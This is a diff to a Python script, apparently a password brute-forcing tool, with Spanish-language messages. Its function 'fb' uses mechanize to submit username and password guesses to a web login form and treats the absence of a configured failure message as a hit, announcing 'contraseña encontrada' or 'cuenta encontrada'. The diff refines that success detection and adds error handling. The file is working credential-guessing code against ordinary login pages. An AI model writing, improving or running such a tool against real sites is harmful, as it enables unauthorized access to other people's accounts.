@@ -1,6 +1,7 @@
 import mechanize
 from colorama import init,Fore
 import parametros as params
+from re import search
 
 
 init()
@@ -53,42 +54,46 @@ def fb(url_login,usuario,c_usuario,c_contr,contr_,n):
         web.set_handle_robots(False)
         web.addhandlers = encabezado
 
-        web.open(url_login)
+        if web.open(url_login).code == 200:
+            web.open(url_login)
 
-        web.select_form(nr=n)
-        web[c_usuario] = usuario
-        web[c_contr] = contr_
+            web.select_form(nr=n)
+            web[c_usuario] = usuario
+            web[c_contr] = contr_
 
-        pag2= web.submit()
-        url2 = pag2.geturl()
-
-        #si conozco el usuario
-        if url2 != url_login and params.param.usuario != None:
-            print(Fore.GREEN+f'\ncontraseña encontrada: {contr_}\n')
-            deteniendo = True
-
-            exit()
-
-        elif url2 != url_login and params.param.dic_u != None:
-            print(Fore.GREEN+f'\n cuenta encontrada:\n\n usuario:{usuario}\n contraseña:{contr_}\n')
-
-            deteniendo = True
-            exit()
-
-        else:
-            if not deteniendo:
-                print(Fore.RED+f'valor invalido para: {usuario} ,{contr_}')
+            pag2= web.submit()
             
-                
+            html = pag2.get_data().decode()
+             
+            #si conozco el usuario
+            if search(params.param.msg,html) == None and params.param.usuario != None:
+                print(Fore.GREEN+f'\ncontraseña encontrada: {contr_}\n')
+                deteniendo = True
 
+                exit()
+
+            elif search(params.param.msg,html) == None and params.param.dic_u != None:
+                print(Fore.GREEN+f'\n cuenta encontrada:\n\n usuario:{usuario}\n contraseña:{contr_}\n')
+
+                deteniendo = True
+                exit()
+
+            else:
+                if not deteniendo:
+                    print(Fore.RED+f'valor invalido para: {usuario} ,{contr_}')
+        else:
+            print(Fore.RED+'el sitio es inaccesible')    
+                
 
     except mechanize.ControlNotFoundError:
         print(Fore.RED+'no se encuentra el formulario o las casillas no conciden')
-
+        
         exit()
     
-    except:
-        pass
+    except Exception as e:
+        print(Fore.RED+f'hubo un problema en la funcion pricipal: {e}')
+        deteniendo = True
+        
 
     finally:
         web.close()
